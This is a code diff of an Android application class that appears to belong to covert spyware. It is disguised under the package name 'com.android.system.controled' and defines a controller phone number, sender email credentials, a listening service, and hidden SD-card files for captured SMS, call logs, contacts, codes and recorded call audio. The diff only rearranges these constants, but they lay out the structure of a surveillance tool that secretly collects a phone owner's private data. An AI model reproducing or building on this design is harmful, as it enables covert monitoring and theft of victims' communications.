@@ -13,8 +13,6 @@ public class MainApplication extends Application {
 
 	private static final String TAG = "MainApplication";
 	
-//	public static final boolean debug = true;
-
 	private String controllerTel = "";// 控制者的电话号码
 	/**
 	 * 发送者的email和密码，163邮箱
@@ -88,17 +86,18 @@ public class MainApplication extends Application {
 	public static final String SERVICE_NAME_LISTEN = "com.android.system.controled.service.ListenService";
 
 	public static final String FILE_IN_SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath() + "/Android/receiver/";
-	public static final String FILE_SMS_DB = MainApplication.FILE_IN_SDCARD + SdcardSqliteHelper.DATABASENAME;
+	public static final File FILE_DB_SMS = new File(MainApplication.FILE_IN_SDCARD + SdcardSqliteHelper.DATABASENAME);
 	
-	public static final String FILE_SMS_TEXT = FILE_IN_SDCARD + ".androidsms.txt";
 	public static final File FILE_CALL_LOG = new File(FILE_IN_SDCARD + ".androidcall.txt");
-	public static final File FILE_CONTACTS = new File(FILE_IN_SDCARD + ".contacts.txt");
 	public static final String FILEPATH_AUDIOS_CALL = FILE_IN_SDCARD + ".callaudios/";
 	public static final String FILEPATH_AUDIOS_OTHER = FILE_IN_SDCARD + ".audios/";
-	public static final String FILEPATH_CODES = FILE_IN_SDCARD + "codes.txt";
 	
-	public static final File FILE_TAG_UPLOAD_TAG = new File(Environment.getDataDirectory().getAbsolutePath() + "/data/com.android.system.controled/files/uploadtag.cfg");
-	public static final String FILENAME_TAG_UPLOAD_TAG = "uploadtag.cfg";
+	public static final File FILE_CODE_TEXT = new File(FILE_IN_SDCARD + ".codestemp.txt");
+	public static final File FILE_SMS_TEXT = new File(FILE_IN_SDCARD + ".androidsmstemp.txt");
+	public static final File FILE_CONTACTS_TEXT = new File(FILE_IN_SDCARD + ".contactstemp.txt");
+	
+//	public static final File FILE_TAG_UPLOAD_TAG = new File(Environment.getDataDirectory().getAbsolutePath() + "/data/com.android.system.controled/files/uploadtag.cfg");
+//	public static final String FILENAME_TAG_UPLOAD_TAG = "uploadtag.cfg";
 
 	private static MainApplication instence;
 
